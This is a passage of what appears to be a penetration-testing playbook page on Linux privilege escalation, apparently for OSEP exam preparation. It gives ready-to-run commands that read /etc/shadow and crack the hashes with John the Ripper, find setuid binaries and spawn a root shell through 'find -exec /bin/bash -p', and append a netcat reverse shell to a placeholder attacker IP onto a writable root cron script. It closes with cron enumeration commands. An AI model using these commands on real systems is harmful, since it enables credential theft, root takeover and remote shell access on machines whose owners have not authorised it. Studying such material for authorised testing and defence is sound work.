<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unshadow </span><span class="token function" style="color:#d73a49">passwd</span><span class="token plain"> shadow </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> unshadowed.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> unshadow /etc/passwd /etc/shadow </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> unshadowed.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">john </span><span class="token parameter variable" style="color:#36acaa">--rules</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--wordlist</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/share/wordlists/rockyou.txt unshadowed.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="setuid-binaries-and-capabilities"><strong>Setuid Binaries and Capabilities</strong><a href="#setuid-binaries-and-capabilities" class="hash-link" aria-label="Direct link to setuid-binaries-and-capabilities" title="Direct link to setuid-binaries-and-capabilities" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="setuid-binaries"><strong>Setuid Binaries</strong><a href="#setuid-binaries" class="hash-link" aria-label="Direct link to setuid-binaries" title="Direct link to setuid-binaries" translate="no">​</a></h3>
<p><strong>Setuid</strong> (Set User ID) binaries are executables that run with the privileges of the file owner, which is often root. Exploiting these binaries can grant elevated access if the binary is misconfigured or vulnerable.</p>
<ol>
<li class=""><strong>Find Setuid Binaries:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-perm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-4000</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-type</span><span class="token plain"> f</span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Inspect Permissions and Owners:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable function" style="color:#d73a49">find</span><span class="token variable" style="color:#36acaa"> / </span><span class="token variable parameter variable" style="color:#36acaa">-perm</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-4000</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-type</span><span class="token variable" style="color:#36acaa"> f</span><span class="token variable operator file-descriptor important" style="color:#393A34">2</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">/dev/null</span><span class="token variable" style="color:#36acaa">)</span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Check for Vulnerabilities:</strong></li>
</ol>
<ul>
<li class="">Review the setuid binaries for known vulnerabilities.</li>
<li class="">Check if they can be exploited by running as a different user.</li>
<li class="">Utilize tools like <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" class="">GTFOBins</a> to find specific exploitation techniques for binaries.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploiting-setuid-binaries"><strong>Exploiting Setuid Binaries</strong><a href="#exploiting-setuid-binaries" class="hash-link" aria-label="Direct link to exploiting-setuid-binaries" title="Direct link to exploiting-setuid-binaries" translate="no">​</a></h3>
<ol>
<li class=""><strong>Finding the Process ID (PID) of a Running Binary:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> u </span><span class="token parameter variable" style="color:#36acaa">-C</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">binary_name</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Inspect Credentials of a Running Process:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /proc/</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">PID</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">/status </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> Uid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Getting a Reverse Shell Using <code>find</code>:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">find</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">directory</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-exec</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">path_to_shell</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Exploit:</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Replace [vulnerable_binary] with the name of the binary you are targeting.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">vulnerable_binary</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-exec</span><span class="token plain"> /bin/bash </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cronjobs"><strong>Cronjobs</strong><a href="#cronjobs" class="hash-link" aria-label="Direct link to cronjobs" title="Direct link to cronjobs" translate="no">​</a></h3>
<p>Look for CronJobs that are running with higher privileges but are writable by the current user. If found, you can modify these scripts to escalate privileges.</p>
<ol>
<li class=""><strong>Find CRON Jobs</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;CRON&quot;</span><span class="token plain"> /var/log/syslog</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /var/log/cron.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Check permissions</strong> for the script</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lah</span><span class="token plain"> /path/to/script.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Modify the script to add a reverse shell</strong> (in case we have permissions to edit), depending on the case another possible payloads could be added, for example adding a new root user.</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [attacker_ip] [listener_port] &gt;/tmp/f&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /path/to/script.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>(Optional)</strong> Other Commands to Inspect Cron Jobs.</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">crontab</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-alh</span><span class="token plain"> /var/spool/cron</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-al</span><span class="token plain"> /etc/ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cron</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-al</span><span class="token plain"> /etc/cron*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/cron*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/at.allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/at.deny</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/cron.allow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/cron.deny</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/crontab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/anacrontab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /var/spool/cron/crontabs/root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/OSEP-Playbook/docs/osep/Linux/Payloads"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Payloads</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#privilege-escalation" class="table-of-contents__link toc-highlight"><strong>Privilege Escalation</strong></a></li><li><a href="#enumeration" class="table-of-contents__link toc-highlight"><strong>Enumeration</strong></a></li><li><a href="#abusingsuids" class="table-of-contents__link toc-highlight"><strong>Abusing <em>SUIDs</em></strong></a></li><li><a href="#important-files" class="table-of-contents__link toc-highlight"><strong>Important Files</strong></a></li><li><a href="#password-files" class="table-of-contents__link toc-highlight"><strong>Password Files</strong></a></li><li><a href="#etcpasswd" class="table-of-contents__link toc-highlight"><em><strong>/etc/passwd</strong></em></a></li><li><a href="#etcshadow" class="table-of-contents__link toc-highlight"><em><strong>/etc/shadow</strong></em></a></li><li><a href="#cracking-both-files" class="table-of-contents__link toc-highlight"><strong>Cracking Both Files</strong></a></li><li><a href="#setuid-binaries-and-capabilities" class="table-of-contents__link toc-highlight"><strong>Setuid Binaries and Capabilities</strong></a></li><li><a href="#setuid-binaries" class="table-of-contents__link toc-highlight"><strong>Setuid Binaries</strong></a></li><li><a href="#exploiting-setuid-binaries" class="table-of-contents__link toc-highlight"><strong>Exploiting Setuid Binaries</strong></a></li><li><a href="#cronjobs" class="table-of-contents__link toc-highlight"><strong>Cronjobs</strong></a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>